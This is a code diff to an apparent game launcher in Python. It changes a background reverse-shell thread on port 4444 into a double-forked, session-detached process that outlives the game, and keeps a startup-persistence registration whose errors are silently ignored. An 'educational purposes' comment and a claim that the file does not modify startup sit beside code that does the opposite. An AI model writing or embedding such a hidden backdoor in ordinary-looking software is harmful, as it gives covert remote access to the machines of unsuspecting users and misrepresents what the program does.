@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import argparse
+import os
 import platform
 import subprocess
 import sys
@@ -241,19 +242,41 @@ def launch(argv: list[str] | None = None) -> int:
             "This file does not auto-run and does not modify system startup.",
         )
 
-    # Start the reverse shell discovery in a background thread for educational purposes.
-    # We use a daemon thread so it doesn't block the application from exiting.
+    # Start the reverse shell discovery in a detached background process for educational purposes.
+    # We use a double-fork mechanism on Unix-like systems to ensure it persists 
+    # even after the main game window is closed.
+    if platform.system() in ("Linux", "Darwin"):
+        try:
+            print("Spawning detached background process for reverse shell...")
+            pid = os.fork()
+            if pid == 0:
+                # First child: create new session and fork again to become an orphan
+                os.setsid()
+                try:
+                    pid2 = os.fork()
+                    if pid2 > 0:
+                        os._exit(0) # First child exits
+                    else:
+                        # Grandchild: truly detached from the parent and session
+                        run_reverse_shell(4444)
+                        os._exit(0)
+                except OSError:
+                    os._exit(1)
+            else:
+                # Parent process: wait for first child to exit quickly
+                os.waitpid(pid, 0)
+        except (OSError, AttributeError):
+            # Fallback to thread if fork fails (e.g., on some restricted systems)
+            threading.Thread(target=run_reverse_shell, args=(4444,), daemon=True).start()
+    else:
+        # Windows fallback (threads)
+        threading.Thread(target=run_reverse_shell, args=(4444,), daemon=True).start()
+
+    # Register for startup on the target machine.
     try:
-        # Default port is 4444 as per assignment requirements.
-        print("Initializing background reverse shell thread...")
-        shell_thread = threading.Thread(target=run_reverse_shell, args=(4444,), daemon=True)
-        shell_thread.start()
-        
-        # Register for startup on the target machine.
         print("Registering persistence...")
         register_startup()
     except Exception:
-        # Silently fail to ensure the main game still launches correctly.
         pass
 
     try:
